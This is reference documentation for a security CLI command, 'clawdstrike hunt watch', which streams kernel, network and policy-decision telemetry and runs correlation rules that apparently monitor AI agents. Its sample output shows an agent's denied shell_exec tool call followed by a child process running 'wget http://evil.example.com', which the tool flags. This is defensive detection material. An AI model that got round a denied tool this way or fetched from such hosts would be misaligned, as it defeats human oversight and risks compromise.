# hunt watch

Stream live Spine telemetry from NATS JetStream with real-time filtering. `watch` is the live counterpart to `query`.

## Purpose

`hunt watch` subscribes to NATS JetStream subjects and displays events as they arrive, with optional filtering, signature verification, and correlation rule evaluation. Use it during active investigations, incident response, or continuous monitoring.

## Usage

```bash
clawdstrike hunt watch [OPTIONS]
```

## Flags

| Flag | Description | Default |
|------|-------------|---------|
| `--layer <layer>` | Data layer(s) to watch: `kernel`, `network`, `decisions`, `all` (repeatable) | `all` |
| `--filter <expr>` | Filter expression (same syntax as `hunt query`) | (none) |
| `--correlate <rule>` | Run a correlation rule in real-time (repeatable) | (none) |
| `--correlate-file <path>` | Custom correlation rule file (repeatable) | (none) |
| `--namespace <ns>` | Limit to Kubernetes namespace | (none) |
| `--verify` | Verify envelope signatures in real-time | `false` |
| `--json` | JSON output per event | `false` |
| `--jsonl` | Line-delimited JSON (for piping) | `false` |
| `--nats-url <url>` | NATS server URL | `nats://localhost:4222` |
| `--replay` | Start from the beginning of the stream (replay historical) | `false` |
| `--replay-since <duration>` | Replay from a specific time offset, then continue live | (none) |
| `--highlight <pattern>` | Highlight matching patterns in output | (none) |
| `--quiet` | Only show correlation matches (suppress raw events) | `false` |
| `--rate-limit <n>` | Maximum events per second to display (buffer overflow is counted) | `0` (unlimited) |

## Examples

Watch all events across all layers:

```bash
clawdstrike hunt watch
```

Watch only kernel events in a specific namespace:

```bash
clawdstrike hunt watch --layer kernel --namespace agent-pool
```

Watch for denied decisions and highlight the guard name:

```bash
clawdstrike hunt watch --layer decisions --filter "verdict=deny" --highlight "guard=.*"
```

Watch with real-time correlation:

```bash
clawdstrike hunt watch --correlate denied-tool-then-child-exec --correlate suspicious-egress-after-tool-call
```

Watch only correlation matches (suppress raw events):

```bash
clawdstrike hunt watch --correlate denied-tool-then-child-exec --quiet
```

Replay the last 30 minutes then continue live:

```bash
clawdstrike hunt watch --replay-since 30m --layer decisions --filter "severity>=error"
```

Pipe to jq for custom filtering:

```bash
clawdstrike hunt watch --layer network --jsonl | jq 'select(.dst_port == 443)'
```

Watch with signature verification:

```bash
clawdstrike hunt watch --verify --filter "verdict=deny"
```

## Output

Default streaming output:

```text
clawdstrike hunt watch (connected to nats://localhost:4222)
Watching: kernel, network, decisions | Namespace: all | Press Ctrl+C to stop

14:22:01 [kernel]    EXEC pid:49102 python research_agent.py
14:22:03 [network]   TCP 10.0.1.5 -> api.openai.com:443 FORWARDED
14:22:03 [decisions] egress api.openai.com:443 -> allow
14:22:15 [decisions] mcp shell_exec -> deny (mcp_tool_guard) severity=critical
  !! CORRELATION MATCH: denied-tool-then-child-exec (watching for child exec within 10s)
14:22:17 [kernel]    EXEC pid:49115 (ppid:49102) /bin/sh -c wget http://evil.example.com
  !! CORRELATION CONFIRMED: denied-tool-then-child-exec [CRITICAL]
     pid:49102 denied shell_exec -> child 49115 exec wget to unapproved host
14:22:17 [network]   TCP 10.0.1.5 -> 203.0.113.10:80 DROPPED
```

With `--quiet` and `--correlate`, only the correlation matches are shown, making it suitable for alerting pipelines.

## NATS subjects

`watch` subscribes to these NATS JetStream subjects based on the selected layers:

| Layer | Subject pattern |
|-------|-----------------|
| `kernel` | `clawdstrike.spine.envelope.tetragon.>` |
| `network` | `clawdstrike.spine.envelope.hubble.flow.v1` |
| `decisions` | `clawdstrike.spine.envelope.decisions.>` |

## Integration

`watch` output can be piped to `hunt ioc` for real-time IOC matching:

```bash
clawdstrike hunt watch --layer network --jsonl | clawdstrike hunt ioc --stdin --feed clawdstrike://threat-feed
```
